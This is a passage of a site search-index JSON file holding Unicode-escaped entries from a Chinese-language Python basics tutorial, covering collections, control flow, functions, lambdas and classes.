lst[::-1] \u8fd4\u56de\u53cd\u8f6c\u7684\u5217\u8868\uff08\u5229\u7528\u524d\u9762\u8bf4\u5230\u7684\u5207\u7247\uff09 \u7edf\u8ba1\u64cd\u4f5c len(lst) \u5f97\u5230\u5217\u8868\u7684\u957f\u5ea6 sum(lst) \u5f97\u5230\u5217\u8868\u7684\u5143\u7d20\u548c\uff08\u672c\u8d28\u4e0a\u662f\u5c06 start \u53c2\u6570\u548c\u6bcf\u4e2a\u5143\u7d20\u4f9d\u6b21\u76f8\u52a0\uff09 \u53ef\u4ee5\u4f20\u5165 start \u53c2\u6570\u7528\u6765\u6307\u5b9a\u52a0\u548c\u7684\u8d77\u59cb\u503c max(lst) \u5f97\u5230\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c min(lst) \u5f97\u5230\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c","title":"\u5217\u8868\u64cd\u4f5c"},{"location":"cs/pl/python/basic/#_10","text":"\u53ef\u4ee5\u770b\u6210\u5143\u7d20\u4e0d\u53ef\u53d8\u7684\u5217\u8868\uff0c\u5185\u90e8\u4e5f\u53ef\u4ee5\u5305\u542b\u4e0d\u540c\u7c7b\u578b\u7684\u5143\u7d20 \u62ec\u53f7\u8868\u793a\u5143\u7ec4\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694 \u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u4e00\u6837\u7684\u65b9\u6cd5\u6765\u8bfb\u53d6\u5143\u7d20\uff0c\u4f46\u5e76\u4e0d\u80fd\u4fee\u6539 \u5f53\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u5019\u8981\u5199\u6210 (a,) \u800c\u4e0d\u662f (a)\uff08\u540e\u8005\u662f\u5355\u4e2a\u503c\uff09 \u53ef\u4ee5\u4f7f\u7528 tuple(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff08\u5217\u8868\u3001\u5b57\u7b26\u4e32\u7b49\uff09\u8f6c\u4e3a\u5143\u7ec4 \u5143\u7ec4\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u5143\u7d20\u5b8c\u5168\u4e0d\u53ef\u53d8 \u907f\u514d\u5728\u5143\u7ec4\u4e2d\u5b58\u653e\u53ef\u53d8\u5143\u7d20","title":"\u5143\u7ec4"},{"location":"cs/pl/python/basic/#_11","text":"\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694\uff0c\u4f1a\u81ea\u52a8\u53bb\u91cd \u53ef\u7528 set(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\u8f6c\u4e3a\u5143\u7ec4\uff0c\u81ea\u52a8\u53bb\u91cd \u96c6\u5408\u4e2d\u4e0d\u80fd\u5305\u542b\u5217\u8868\u7b49\u4e0d\u53ef hash \u5316\u7684\u5143\u7d20 \u4fee\u6539 s.add(...) \u6765\u52a0\u5165\u4e00\u4e2a\u5143\u7d20 s.remove(...) \u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u4f1a\u629b\u51fa\u5f02\u5e38 s.discard(...) \u6765\u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u5219\u5ffd\u7565 \u8fd0\u7b97 s1 & s2\u3001s1 | s2\u3001s1 - s2 \u4ea4\u96c6\u3001\u5e76\u96c6\u3001\u5dee\u96c6 s1 ^ s2 \u5bf9\u79f0\u5dee\u96c6","title":"\u96c6\u5408"},{"location":"cs/pl/python/basic/#_12","text":"\u5b58\u50a8\u952e\u503c\u5bf9\uff0c\u4e5f\u662f\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u4e0d\u8fc7\u9017\u53f7\u5206\u9694\u7684\u662f\u952e\u503c\u5bf9 {key: value, ...} {} \u662f\u7a7a\u5b57\u5178\u800c\u4e0d\u662f\u7a7a\u96c6\u5408 \u901a\u8fc7 d[key] \u6765\u8bbf\u95ee\u5b57\u5178\u4e2d key \u5bf9\u5e94\u7684\u503c\uff0c\u53ef\u4ee5\u8bfb\u53d6\u3001\u4fee\u6539 \u6dfb\u52a0\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 d[key] = value \u6765\u8fdb\u884c \u5220\u9664\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5 del d[key] \u901a\u8fc7 d[key] \u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728 key \u8fd9\u4e2a\u952e\u4f1a\u629b\u51fa\u5f02\u5e38 \u901a\u8fc7 d.get(key) \u6765\u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728\u5219\u4f1a\u8fd4\u56de None \u4f7f\u7528 d.get(key, default) \u5982\u679c\u6ca1\u6709 key \u65f6\u4f1a\u8fd4\u56de default \u503c d.update(d2) \u6765\u7528 d2 \u4e2d\u7684\u952e\u503c\u5bf9\u66f4\u65b0 d","title":"\u5b57\u5178"},{"location":"cs/pl/python/basic/#_13","text":"","title":"\u6761\u4ef6\u5206\u652f"},{"location":"cs/pl/python/basic/#_14","text":"== \u5224\u65ad\u76f8\u7b49\uff08\u76f8\u7b49\u5219\u8fd4\u56de True\uff09\uff0c != \u5224\u65ad\u4e0d\u7b49 \u4f7f\u7528 and or not \u6765\u8fdb\u884c\u5e03\u5c14\u8fd0\u7b97\uff0c\u5fc5\u8981\u65f6\u52a0\u62ec\u53f7\u4fdd\u8bc1\u4f18\u5148\u7ea7 \u6570\u503c\u6bd4\u8f83\u5927\u5c0f < <= > >= \u5224\u65ad\u5143\u7d20\u662f\u5426\u5728\u5217\u8868\u4e2d value in lst\uff1a\u5982\u679c\u5728\u5219\u503c\u4e3a True value not in lst\uff1a\u5982\u679c\u5728\u5219\u4e3a False\uff08\u5224\u65ad\u662f\u5426\u4e0d\u5728\uff09 \u5224\u65ad\u952e\u662f\u5426\u5728\u5b57\u5178\u4e2d key in d\u3001key not in d \u4e0e\u5217\u8868\u540c\u7406","title":"\u5e03\u5c14\u8868\u8fbe\u5f0f"},{"location":"cs/pl/python/basic/#_15","text":"if-elif-else \u7ed3\u6784\uff08\u4e0d\u662f else if\uff09 elif\u3001else \u5747\u53ef\u4ee5\u7701\u7565 \u6761\u4ef6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7\uff08\u52a0\u4e86\u4e5f\u6ca1\u95ee\u9898\uff09 condition \u4f1a\u88ab\u8f6c\u6362\u6210 bool \u7c7b\u578b\u7136\u540e\u5224\u65ad \u6ce8\u610f\u7f29\u8fdb \u7c7b\u4e09\u76ee\u8fd0\u7b97\u7b26\u5199\u6cd5 a if condition else b \u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u4e2d\u7684 condition? a : b if condition1 : ... elif condition2 : ... elif condition3 : ... else : ...","title":"\u6761\u4ef6\u8bed\u53e5"},{"location":"cs/pl/python/basic/#_16","text":"\u7f29\u8fdb\u662f python \u4e2d\u5f88\u91cd\u8981\u7684\u4e1c\u897f\uff0cpython \u9760\u7f29\u8fdb\u6765\u5f97\u5230\u4ee3\u7801\u7ed3\u6784\uff0c\u800c\u4e0d\u662f\u5927\u62ec\u53f7 \u7f29\u8fdb\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u5236\u8868\u7b26 \u5982\u679c\u4e00\u4e9b\u4ee3\u7801\u5904\u4e8e\u540c\u4e00\u5c42\u7f29\u8fdb\u4e0b\uff0c\u5219\u5c5e\u4e8e\u540c\u4e00\u4e2a\u4ee3\u7801\u5757 \u540c\u4e00\u4e2a\u4ee3\u7801\u5757\u7684\u7f29\u8fdb\u8981\u7edf\u4e00 \u4e0d\u4ec5\u4ec5\u662f\u770b\u7740\u50cf\uff0c\u8981\u533a\u5206\u597d\u7a7a\u683c\u4e0e\u5236\u8868\u7b26 4 \u4e2a\u7a7a\u683c\u4e0e\u4e00\u4e2a\u663e\u793a\u5bbd\u5ea6\u4e3a 4 \u7684\u5236\u8868\u7b26\u5e76\u4e0d\u662f\u540c\u4e00\u7f29\u8fdb \u4e00\u822c\u4f7f\u7528 4 \u7a7a\u683c\u7f29\u8fdb\uff0c\u6216\u8005 1 \u5236\u8868\u7b26\u7f29\u8fdb \u7f16\u8f91\u5668\u4e2d\u6309 Tab \u6253\u51fa\u7684\u4e5f\u4e0d\u4e00\u5b9a\u662f\u5236\u8868\u7b26\uff0c\u8981\u5206\u6e05 \u7f29\u8fdb\u4e0d\u6b63\u786e\u4f1a\u62a5 IndentationError\uff0c\u6b64\u65f6\u6ce8\u610f\u68c0\u67e5\u7f29\u8fdb","title":"\u7f29\u8fdb"},{"location":"cs/pl/python/basic/#_17","text":"","title":"\u5faa\u73af"},{"location":"cs/pl/python/basic/#for","text":"python \u4e2d\u7684 for \u5faa\u73af\u5e76\u4e0d\u50cf c \u4e2d\u662f\u6307\u5b9a\u4e00\u4e2a\u53d8\u91cf\u7684\u53d8\u5316\u65b9\u5f0f\uff0c\u800c\u662f\u4ece\u5217\u8868/\u5143\u7ec4/\u8fed\u4ee3\u5668\u7b49\u53ef\u8fed\u4ee3\u5bf9\u8c61\u4e2d\u904d\u5386\u503c for \u5faa\u73af\u4f1a\u4ea7\u751f\u4e00\u4e2a\u7528\u4e8e\u5faa\u73af\u7684\u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u5728\u5faa\u73af\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u5220\u9664\uff0c\u800c\u662f\u4fdd\u7559\u6700\u540e\u4e00\u6b21\u7684\u503c \u53ef\u4ee5\u4f7f\u7528 range \u6765\u751f\u6210\u4e00\u4e32\u6570\u5b57\u7528\u6765\u5faa\u73af range(a, b) \u751f\u6210\u4ece a \u5230 b-1 \u7684\u8fde\u7eed\u6574\u6570 range(a, b, c) \u4ee5 c \u4e3a\u6b65\u957f\u751f\u6210 range \u5f97\u5230\u7684\u5e76\u4e0d\u662f\u5217\u8868\uff0c\u5982\u679c\u8981\u7528\u5176\u751f\u6210\u5217\u8868\u8981\u4f7f\u7528 list(range(...)) for value in lst : ... for value in range ( ... ): ...","title":"for \u5faa\u73af"},{"location":"cs/pl/python/basic/#for_1","text":"\u6709\u4e09\u79cd\u65b9\u6cd5\u6765\u904d\u5386\u5b57\u5178 \u5728 d.keys() \u4e2d\u5faa\u73af\u904d\u5386\u6240\u6709\u952e \u5728 d.values() \u4e2d\u5faa\u73af\u904d\u5386\u6240\u6709\u503c \u5728 d.items() \u4e2d\u904d\u5386\u952e\u503c\u5bf9\uff08\u9700\u8981\u89e3\u5305\uff09 for key in d . keys (): ... for value in d . values (): ... for item in d . items (): ... # item \u4e3a\u4e00\u4e2a\u5143\u7ec4 for key , value in d . items (): ... # \u5c06 item \u89e3\u5305","title":"for \u5faa\u73af\u904d\u5386\u5b57\u5178"},{"location":"cs/pl/python/basic/#_18","text":"\u8d4b\u503c\u65f6\u7b49\u53f7\u5de6\u4fa7\u53ef\u4ee5\u662f\u7528\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a\u503c\uff0c\u8fd9\u65f6\u4f1a\u5c06\u53f3\u4fa7\u89e3\u5305\u5206\u522b\u8d4b\u503c\u7ed9\u5de6\u4fa7\u7684\u5404\u4e2a\u53d8\u91cf \u53f3\u4fa7\u4e5f\u53ef\u4ee5\u662f\u591a\u4e2a\u503c\uff08\u53ea\u8981\u51fa\u73b0\u9017\u53f7\u5c31\u4f1a\u89c6\u4e3a\u4e00\u4e2a\u5143\u7ec4\uff09 \u53ef\u4ee5\u901a\u8fc7 a, b = b, a \u5b9e\u73b0\u5143\u7d20\u4ea4\u6362 \u661f\u53f7\u8868\u8fbe\u5f0f \u53ef\u4ee5\u7528\u6765\u5728\u53ef\u8fed\u4ee3\u5bf9\u8c61\u5185\u90e8\u89e3\u5305 \u4e5f\u53ef\u7528\u6765\u6807\u8bb0\u4e00\u4e2a\u53d8\u91cf\u5305\u542b\u591a\u4e2a\u503c for \u5faa\u73af\u53ef\u4ee5\u89e3\u5305 t = ( 1 , 2 , 3 ) a , b , c = t # a = 1, b = 2, c = 3 t = ( 1 , 2 , ( 3 , 4 )) a , b , ( c , d ) = t # c = 3, d = 4 l = [ 1 , 2 , * [ 3 , 4 ]] # [3, 4] \u88ab\u89e3\u5305 ## l = [1, 2, 3, 4] a , * b = [ 1 , 2 , 3 , 4 ] ## a = 1, b = [2, 3, 4] lst = [[ 1 , 2 ], [ 3 , 4 ]] for a , b in lst : ... # \u7b2c\u4e00\u6b21\u5faa\u73af a, b \u4e3a 1, 2 # \u7b2c\u4e8c\u6b21\u5faa\u73af a, b \u4e3a 3, 4","title":"\u5143\u7d20\u89e3\u5305"},{"location":"cs/pl/python/basic/#for_2","text":"enumerate \u8ba1\u6570 \u53ef\u4ee5\u6307\u5b9a\u521d\u59cb\u503c zip \u540c\u65f6\u5faa\u73af\u591a\u4e2a\u53ef\u8fed\u4ee3\u5bf9\u8c61 \u5faa\u73af\u6b21\u6570\u4e3a\u6700\u77ed\u7684\u5bf9\u8c61\u7684\u957f\u5ea6 for i , value in enumerate ( lst ): ... # i \u4f9d\u6b21\u4e3a 0\uff0c1\uff0c2\uff0c\u2026\u2026 for i , value in enumerate ( lst , 1 ): ... # i \u4f9d\u6b21\u4e3a 1\uff0c2\uff0c3\uff0c\u2026\u2026 for a , b in zip ( lst1 , lst2 ): ... # a \u5728 lst1 \u4e2d\u5faa\u73af # b \u5728 lst2 \u4e2d\u5faa\u73af","title":"for \u5faa\u73af\u6280\u5de7"},{"location":"cs/pl/python/basic/#_19","text":"\u4e00\u79cd\u5f88\u65b9\u4fbf\u7684\u751f\u6210\u5217\u8868\u7684\u65b9\u5f0f \u5373\u5728\u5217\u8868\u4e2d\u5305\u542b\u5faa\u73af\uff0c\u9010\u6b21\u8bb0\u5f55\u5faa\u73af\u524d\u8868\u8fbe\u5f0f\u7684\u503c \u53ef\u4ee5\u6709\u591a\u91cd\u5faa\u73af\uff0c\u5373\u751f\u6210\u7b1b\u5361\u5c14\u79ef \u53ef\u4ee5\u5305\u542b\u6761\u4ef6\uff0c\u5373\u5728\u6761\u4ef6\u6210\u7acb\u65f6\u624d\u8bb0\u5f55\u503c \u5217\u8868\u63a8\u5bfc\u4e2d\u7684\u5faa\u73af\u53d8\u91cf\u6709\u5c40\u90e8\u4f5c\u7528\u57df \u5373\u5728\u5217\u8868\u63a8\u5bfc\u5916\u4e0d\u80fd\u8bbf\u95ee\u5faa\u73af\u53d8\u91cf lst = [] for i in range ( 1 , 10 ): lst . append ( i ** 2 ) ## \u7b49\u4ef7\u4e8e lst = [ i ** 2 for i in range ( 1 , 10 )] lst1 = [ x * y for x in l1 for y in l2 ] lst2 = [ ... for ... in ... if ... ]","title":"\u5217\u8868\u63a8\u5bfc"},{"location":"cs/pl/python/basic/#_20","text":"\u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u63a8\u5bfc\u7c7b\u4f3c\u7684\u65b9\u6cd5\u751f\u6210\u5143\u7ec4\u548c\u5b57\u5178 \u751f\u6210\u5143\u7ec4\u7684\u65f6\u5019\u8981\u7528 tuple() \u53ea\u5199 () \u7684\u8bdd\u5219\u53ea\u662f\u751f\u6210\u5668\u8868\u8fbe\u5f0f \u751f\u6210\u5b57\u5178\u65f6\u5faa\u73af\u524d\u7528 : \u5c06\u952e\u503c\u9694\u5f00 tuple ( i ** 2 for i in range ( 1 , 10 )) ( i ** 2 for i in range ( 1 , 10 )) ## ^ generator object { a : b for a in ... for b in ... }","title":"\u751f\u6210\u5143\u7ec4/\u5b57\u5178"},{"location":"cs/pl/python/basic/#_21","text":"\u548c\u5176\u5b83\u8bed\u8a00\u4e00\u6837\uff0c\u5728\u5faa\u73af\u4ee3\u7801\u5757\u4e2d\u53ef\u4ee5\u63a7\u5236\u5faa\u73af\u7684\u8fdb\u884c break \u7acb\u523b\u7ed3\u675f\u5faa\u73af continue \u7acb\u523b\u8fdb\u884c\u4e0b\u4e00\u8f6e\u5faa\u73af","title":"\u63a7\u5236\u5faa\u73af"},{"location":"cs/pl/python/basic/#while","text":"while \u5faa\u73af\u5373\u8fdb\u884c\u6761\u4ef6\u68c0\u67e5\uff0c\u5982\u679c\u4e3a True \u5219\u7ee7\u7eed\u8fd0\u884c\u76f4\u5230\u6761\u4ef6\u4e0d\u6ee1\u8db3\u505c\u6b62 while condition : ...","title":"while \u5faa\u73af"},{"location":"cs/pl/python/basic/#_22","text":"","title":"\u51fd\u6570"},{"location":"cs/pl/python/basic/#_23","text":"\u4f7f\u7528 def \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u51fd\u6570 \u5148\u51fd\u6570\u540d\uff0c\u7136\u540e\u62ec\u53f7\u5217\u51fa\u53c2\u6570\uff0c\u4e0b\u9762\u63a5\u4ee3\u7801\u5757 \u4f7f\u7528 return \u8fd4\u56de \u6ca1\u6709 return \u8fd0\u884c\u5230\u7ed3\u5c3e\uff0c\u8fd4\u56de None \u53ea\u6709 return\uff0c\u8fd4\u56de None return \u540e\u63a5\u5185\u5bb9\uff0c\u8fd4\u56de\u5185\u5bb9 return \u7684\u503c\u7c7b\u578b\u4e0d\u8981\u6c42\u4e00\u81f4 return \u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\uff08\u5229\u7528\u5143\u7ec4\uff09 def func_name ( arg1 , arg2 ): ... def func_name ( arg1 , arg2 ): ... return ... def func_name ( arg1 , arg2 ): ... return ... , ...","title":"\u51fd\u6570\u5b9a\u4e49"},{"location":"cs/pl/python/basic/#_24","text":"\u62ec\u53f7\u4e2d\u8981\u5217\u51fa\u53c2\u6570\u540d\uff0c\u4f9b\u51fd\u6570\u4f53\u5185\u4f7f\u7528 \u53ef\u4ee5\u5728\u53c2\u6570\u540e\u63a5\u7b49\u53f7\u8d4b\u9ed8\u8ba4\u503c \u4f7f\u7528\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5728\u8c03\u7528\u65f6\u53ef\u4ee5\u4e0d\u7528\u4f20 \u5229\u7528 * \u6765\u63a5\u6536\u4efb\u610f\u591a\u53c2\u6570 \u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5143\u7ec4 * \u53c2\u6570\u540e\u9762\u4e0d\u80fd\u518d\u6709\u5176\u5b83\u975e\u5173\u952e\u5b57\u53c2\u6570 \u5229\u7528 ** \u6765\u63a5\u6536\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570 \u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5b57\u5178 def func ( arg1 , arg2 ): ... def func ( arg1 , arg2 = \"...\" ): # \u9ed8\u8ba4\u503c ... def func ( arg1 , * arg2 ): # \u4efb\u610f\u591a\u53c2\u6570 ... def func ( arg1 , ** arg2 ): # \u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570 ... def func ( arg1 , * arg2 , ** arg3 ): ... # *arg2 \u540e\u53ef\u4ee5\u52a0 **arg3","title":"\u51fd\u6570\u53c2\u6570"},{"location":"cs/pl/python/basic/#_25","text":"\u901a\u8fc7 \u51fd\u6570\u540d(\u53c2\u6570) \u6765\u8c03\u7528\u51fd\u6570\uff0c\u5f97\u5230\u8fd4\u56de\u503c \u76f4\u63a5\u4f20\u53c2\u7684\u8bdd\u8981\u5c06\u53c2\u6570\u4e0e\u5b9a\u4e49\u5bf9\u5e94\u4e0a \u901a\u8fc7\u5173\u952e\u5b57\u4f20\u53c2\uff08\u53c2\u6570\u540d\uff09\u53ef\u4ee5\u6253\u4e71\u987a\u5e8f \u5e26\u6709\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5982\u679c\u4e0d\u4f20\u5219\u4f7f\u7528\u9ed8\u8ba4\u503c \u5982\u679c\u8bfb\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570\uff0c\u5219\u591a\u4f59\u7684\u8bfb\u5230\u5b57\u5178\u4e2d def func ( a , b ): ... func ( 1 , 2 ) # a = 1, b = 2 func ( b = 1 , a = 2 ) # a = 2, b = 1 def func2 ( a , ** b ): ... func2 ( a = 1 , b = 2 , c = 3 ) ## a = 1, b = {\"b\": 2, \"c\": 3}","title":"\u51fd\u6570\u8c03\u7528"},{"location":"cs/pl/python/basic/#_26","text":"python \u4e2d\u7684\u53d8\u91cf\u90fd\u662f\u5f15\u7528\u7684\uff08\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u524d\u9762\u8bf4\u4e0d\u8981\u5c06\u53d8\u91cf\u7406\u89e3\u4e3a\u76d2\u5b50\uff09 \u7528 = \u5b9e\u9645\u4e0a\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u522b\u540d lst1 = lst2\uff0c\u5219 lst1 \u548c lst2 \u4f1a\u540c\u65f6\u53d8\u5316\uff08\u8981\u7528 [:] \u521b\u5efa\u526f\u672c\uff09 \u6570\u503c\u7c7b\u578b\u6709\u4f18\u5316\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd9\u6837 == \u68c0\u67e5\u503c\u662f\u5426\u76f8\u7b49\uff0cis \u68c0\u67e5\u503c\u662f\u5426\u76f8\u540c \u89c2\u5bdf pythontutor.com \u51fd\u6570\u53c2\u6570\u4f20\u9012\u53ea\u6709\u201c\u5171\u4eab\u4f20\u53c2\u201d\u4e00\u79cd\u5f62\u5f0f\uff08\u5373\u4f20\u5f15\u7528\uff09 \u53ef\u53d8\u53d8\u91cf\uff08\u4f8b\u5982\u5217\u8868\uff09\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u88ab\u6539\u53d8 \u907f\u514d\u5411\u51fd\u6570\u4f20\u9012\u53ef\u53d8\u53d8\u91cf\uff08\u5217\u8868\u53ef\u4f20\u5165 [:] \u521b\u5efa\u7684\u526f\u672c\uff09","title":"*\u5f15\u7528\u53d8\u91cf"},{"location":"cs/pl/python/basic/#_27","text":"\u53ef\u4ee5\u901a\u8fc7 lambda \u8868\u8fbe\u5f0f\u6765\u5b9a\u4e49\u533f\u540d\u51fd\u6570 lambda \u8f93\u5165: \u8f93\u51fa\u8868\u8fbe\u5f0f \u53ef\u4ee5\u6709\u591a\u4e2a\u8f93\u5165 \u53ef\u4ee5\u5c06\u4e00\u4e2a\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf \u907f\u514d\u7528 lambda \u8d4b\u503c\u7684\u5f62\u5f0f\u5b9a\u4e49\u51fd\u6570 \u4f8b\u5982 __name__ \u5c5e\u6027\u4e0d\u4f1a\u662f\u51fd\u6570\u540d\uff0c\u800c\u662f \"\\<lambda>\" lambda a : a ** 2 + 2 * a + 1 ( lambda a : a ** 2 + 2 * a + 1 )( 2 ) # 9 lambda a , b : a * 2 + b f = lambda a : a ** 2 + 2 * a + 1 ## \u8fd1\u4f3c\u7b49\u4ef7\u4e8e def f ( a ): return a ** 2 + 2 * a + 1","title":"\u533f\u540d\u51fd\u6570"},{"location":"cs/pl/python/basic/#_28","text":"\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u4f7f\u7528\u5185\u7f6e\u7684 input \u51fd\u6570 \u51fd\u6570\u53c2\u6570\u4e3a\u8981\u663e\u793a\u7684\u63d0\u793a\u7b26\uff0c\u4f8b\u5982 input(\"> \") \u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\uff08\u5373\u8bfb\u5230\u6362\u884c\u4e3a\u6b62\uff09","title":"\u7528\u6237\u8f93\u5165"},{"location":"cs/pl/python/basic/#_29","text":"\u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u7684\u51fd\u6570\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570 \u6bd4\u8f83\u5e38\u7528\u7684\u6709 map\u3001filter list ( map ( lambda x : x * 2 , [ 1 , 2 ])) ## [2, 4] list ( filter ( lambda x : x > 1 , [ 1 , 2 , 3 ])) ## [2, 3]","title":"\u9ad8\u9636\u51fd\u6570\u7528\u6cd5"},{"location":"cs/pl/python/basic/#_30","text":"","title":"\u7c7b\u4e0e\u9762\u5411\u5bf9\u8c61"},{"location":"cs/pl/python/basic/#_31","text":"\u7c7b\u53ef\u4ee5\u770b\u6210\u5305\u542b\u4e00\u4e9b \u5c5e\u6027 \u548c \u65b9\u6cd5 \u7684\u6846\u67b6 \u6839\u636e\u7c7b\u6765\u521b\u5efa\u5bf9\u8c61 -> \u5b9e\u4f8b\u5316 \u7528 class \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7c7b \u7c7b\u4e2d\u7684\u51fd\u6570 -> \u65b9\u6cd5 \u7279\u6b8a\u65b9\u6cd5 __init__\uff0c\u5728\u7c7b\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528 \u5176\u5b83\u4e00\u822c\u7684\u65b9\u6cd5\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u8981\u4e3a\"self\"\uff0c\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u4f20\u5165 \u76f4\u63a5\u5199\u5728\u7c7b\u4e2d\u7684\u662f\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e3a self.\\<name> \u8d4b\u503c\u7684\u5f62\u5f0f\u521b\u5efa\u5c5e\u6027 \u7528\u7c7b\u4f3c\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u5b9e\u4f8b\u5316\u7c7b\uff0c\u53c2\u6570\u4e3a__init__\u65b9\u6cd5\u7684\u53c2\u6570 \u76f4\u63a5\u901a\u8fc7 .\\<method> .\\<attribute> \u7684\u5f62\u5f0f\u8c03\u7528\u65b9\u6cd5/\u83b7\u53d6\u5c5e\u6027 class ClassName (): a = 1 def __init__ ( self , arg1 , arg2 ): self . arg1 = arg1 self . arg2 = arg2 def method ( self ): print ( self . arg1 , self . arg2 , self . a ) obj = ClassName ( 2 , 3 ) obj . method () # 2 3 1 print ( obj . a , obj . arg1 ) # 1 2","title":"\u7c7b"},{"location":"cs/pl/python/basic/#_32","text":"\u5728 class \u5b9a\u4e49\u7684\u62ec\u53f7\u4e2d\u52a0\u4e0a\u53e6\u4e00\u4e2a\u7c7b\u540d\u5219\u8868\u793a\u7ee7\u627f\u81ea\u90a3\u4e2a\u7c7b\u5b9a\u4e49\u4e00\u4e2a\u5b50\u7c7b \u5b50\u7c7b\u4f1a\u7ee7\u627f\u7236\u7c7b\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5 \u5b50\u7c7b\u7f16\u5199\u548c\u7236\u7c7b\u540d\u5b57\u4e00\u6837\u7684\u65b9\u6cd5\u4f1a \u91cd\u8f7d \u5728\u91cd\u8f7d\u7684\u65b9\u6cd5\u4e2d\u8c03\u7528\u7236\u7c7b\u7684\u539f\u65b9\u6cd5\u4f7f\u7528 super() \u4e5f\u53ef\u4ee5\u4e3a\u5b50\u7c7b\u5b9a\u4e49\u72ec\u6709\u7684\u65b9\u6cd5 class ClassA (): def __init__ ( self , a ): self . a = a def print ( self ): print ( self . a ) class ClassB ( ClassA ): def __init__ ( self , a ): super () . __init__ ( a ) self . a *= 2 obj = ClassB ( 1 ) obj . print () # 2","title":"\u7c7b\u7684\u7ee7\u627f"},{"location":"cs/pl/python/basic/#_33","text":"python \u4e2d\u7c7b\u5e76\u6ca1\u6709\u4e25\u683c\u79c1\u6709\u7684\u5c5e\u6027 \u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u4f1a\u88ab\u9690\u85cf\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6 \u4f46\u8fd9\u79cd\u5c5e\u6027\u53ef\u4ee5\u901a\u8fc7 _\u7c7b\u540d__\u5c5e\u6027 \u4f46\u65b9\u5f0f\u8bfb\u53d6\u5230 \u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u53ef\u4ee5\u8f7b\u5fae\u4fdd\u62a4\u5c5e\u6027\uff0c\u4f46\u5e76\u4e0d\u4ee3\u8868\u5176\u662f\u79c1\u6709\u7684 class A (): a = 1 _a = 2 __a = 3 obj = A () print ( obj . a ) # 1 print ( obj . _a ) # 2 print ( obj . __a ) # AttributeError print ( obj . _A__a ) # 3","title":"\u79c1\u6709\uff1f"},{"location":"cs/pl/python/basic/#_34","text":"python \u4e2d\u5373\u4f7f\u6700\u7b80\u5355\u7684\u6574\u6570\u4e5f\u662f\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b \u901a\u8fc7 dir(...) \u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027/\u65b9\u6cd5 \u6709\u5f88\u591a\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u3001\u53cc\u4e0b\u5212\u7ebf\u7ed3\u5c3e\u7684\u65b9\u6cd5\uff0c\u6210\u4e3a\u9b54\u672f\u65b9\u6cd5\uff08dunder method\uff09","title":"\u4e00\u5207\u7686\u5bf9\u8c61\uff1f"},{"location":"cs/pl/python/basic/#_35","text":"\u5f88\u591a\u51fd\u6570\u3001\u8868\u8fbe\u5f0f\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528\u7c7b\u7684\u9b54\u672f\u65b9\u6cd5\u6765\u5b9e\u73b0\u7684 len(obj) \u8c03\u7528 obj.__len__() obj[...] \u8c03\u7528 